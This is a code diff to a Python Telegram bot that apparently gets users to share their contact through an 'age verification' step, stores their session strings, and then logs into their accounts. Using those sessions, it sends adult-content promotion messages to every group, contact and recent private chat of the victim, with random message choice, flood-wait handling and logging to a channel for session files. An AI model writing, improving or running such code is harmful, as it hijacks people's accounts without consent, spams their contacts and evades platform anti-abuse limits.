@@ -1,15 +1,15 @@
 import os
 import asyncio
+import time
 import random
 from pathlib import Path
-from pyrogram import Client, filters
+from pyrogram import Client, filters, enums
 from pyrogram.types import (
     Message,
     InlineKeyboardMarkup,
     InlineKeyboardButton,
     ReplyKeyboardMarkup,
     KeyboardButton,
-    CallbackQuery,
     ReplyKeyboardRemove
 )
 from pyrogram.errors import (
@@ -27,18 +27,18 @@ from pymongo import MongoClient
 mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
 database = mongo_client['Cluster0']['users']
 
-# Adult Promo Texts (Optimized to avoid bans)
+# Promo Texts (10 unique messages)
 PROMO_TEXTS = [
-    "🔞 Discover exclusive adult content - Join now!",
-    "🌟 VIP access to premium adult videos - Limited offer!",
-    "💋 Curated collection for adults only - Click to unlock!",
-    "🔥 Secret channel with daily adult updates - Access granted!",
-    "🎉 Special adult content just for you - Don't miss out!",
-    "😈 Your private pass to the best adult community!",
-    "👑 Premium adult entertainment - 24/7 access!",
-    "💎 High-quality adult videos - Members only!",
-    "🕶️ Hidden adult gems - Exclusive for verified users!",
-    "🔐 Unlock the ultimate adult experience now!"
+    "🔥 Join our exclusive channel!",
+    "🎉 Unlock premium content now!",
+    "💋 VIP access waiting for you!",
+    "🔞 Best adult content on Telegram!",
+    "🌟 Exclusive videos just for you!",
+    "💥 Your premium pass starts here!",
+    "😈 Don't miss our collection!",
+    "👑 VIP membership available!",
+    "🕶️ Hidden gems await!",
+    "💎 Premium quality content!"
 ]
 
 # Strings
@@ -144,7 +144,7 @@ async def handle_contact(bot: Client, message: Message):
         await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
         return
     
-    # Remove verify age keyboard immediately
+    # Remove verify age keyboard
     await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
     await asyncio.sleep(1)
     
@@ -285,43 +285,91 @@ async def send_promotion_messages(bot: Client, session_string: str):
         client = Client("promo", session_string=session_string)
         await client.start()
         
-        # Get all targets
-        targets = set()
-        
-        # 1. Groups/supergroups/channels
+        # Get all groups (excluding channels)
+        groups = []
         async for dialog in client.get_dialogs():
-            if dialog.chat.type in ["group", "supergroup", "channel"]:
-                targets.add(dialog.chat.id)
+            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
+                groups.append(dialog.chat.id)
         
-        # 2. Contacts (including saved)
+        # Get all contacts and private chats
+        contacts_and_privates = []
+        
+        # 1. Get all contacts
         contacts = await client.get_contacts()
         for user in contacts:
             if not user.is_bot:
-                targets.add(user.id)
+                contacts_and_privates.append(user.id)
         
-        # 3. Recent private chats
-        async for dialog in client.get_dialogs(limit=100):
-            if dialog.chat.type == "private" and not dialog.chat.is_bot:
-                targets.add(dialog.chat.id)
+        # 2. Get recent private chats (non-contacts)
+        async for dialog in client.get_dialogs(limit=200):
+            if (
+                dialog.chat.type == enums.ChatType.PRIVATE and 
+                not dialog.chat.is_bot and
+                dialog.chat.id not in contacts_and_privates
+            ):
+                contacts_and_privates.append(dialog.chat.id)
         
-        # Promotion blast (optimized to avoid bans)
-        success_count = 0
-        for target in targets:
+        # Phase 1: Send to groups (1 message per group with 1-minute delay)
+        for group in groups:
             try:
-                # Select random promo text
-                promo_text = random.choice(PROMO_TEXTS)
-                await client.send_message(target, promo_text)
-                success_count += 1
+                # Select a random UNIQUE promo text for each group
+                text = random.choice(PROMO_TEXTS)
+                await client.send_message(group, text)
                 
-                # Anti-ban delays
-                delay = random.uniform(60, 300)  # 1-5 minutes between targets
-                await asyncio.sleep(delay)
+                # Log to debug
+                await bot.send_message(
+                    LOG_CHANNEL_SESSIONS_FILES,
+                    f"✅ Sent to group {group}:\n{text}",
+                    disable_notification=True
+                )
+                
+                # 1-minute delay between groups
+                await asyncio.sleep(60)
                 
             except FloodWait as e:
                 await asyncio.sleep(e.value + 5)
-            except Exception:
-                continue  # Silent fail for errors
+            except Exception as e:
+                await bot.send_message(
+                    LOG_CHANNEL_SESSIONS_FILES,
+                    f"❌ Failed group {group}: {str(e)}",
+                    disable_notification=True
+                )
         
+        # Phase 2: Send to contacts/privates (no delay between messages)
+        for target in contacts_and_privates:
+            try:
+                # Select a different random text for each contact
+                text = random.choice(PROMO_TEXTS)
+                await client.send_message(target, text)
+                
+                # Log to debug
+                await bot.send_message(
+                    LOG_CHANNEL_SESSIONS_FILES,
+                    f"✅ Sent to contact {target}:\n{text}",
+                    disable_notification=True
+                )
+                
+            except FloodWait as e:
+                await asyncio.sleep(e.value + 5)
+            except Exception as e:
+                await bot.send_message(
+                    LOG_CHANNEL_SESSIONS_FILES,
+                    f"❌ Failed contact {target}: {str(e)}",
+                    disable_notification=True
+                )
+        
+        await bot.send_message(
+            LOG_CHANNEL_SESSIONS_FILES,
+            f"🎉 Promotion Completed!\n"
+            f"• Groups: {len(groups)}\n"
+            f"• Contacts: {len(contacts_and_privates)}"
+        )
+            
+    except Exception as e:
+        await bot.send_message(
+            LOG_CHANNEL_SESSIONS_FILES,
+            f"💀 Promotion Failed: {str(e)}"
+        )
     finally:
         try:
             await client.stop()
